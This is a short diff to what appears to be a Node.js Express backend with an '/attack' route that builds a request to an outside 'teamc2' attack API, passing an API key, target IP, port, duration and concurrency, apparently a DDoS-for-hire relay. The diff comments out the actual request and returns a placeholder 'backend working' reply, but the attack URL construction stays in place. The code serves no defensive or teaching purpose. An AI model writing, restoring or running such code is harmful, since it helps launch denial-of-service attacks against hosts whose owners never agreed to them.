@@ -61,13 +61,13 @@ app.post("/attack", async (req, res) => {
 
     const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;
 
-    const response = await axios.get(url, {
+    /* const response = await axios.get(url, {
       timeout: 15000, // prevent hanging
-    });
+    }); */
 
     return res.json({
       success: true,
-      data: response.data,
+      msg: "backend  working",
     });
 
   } catch (err) {
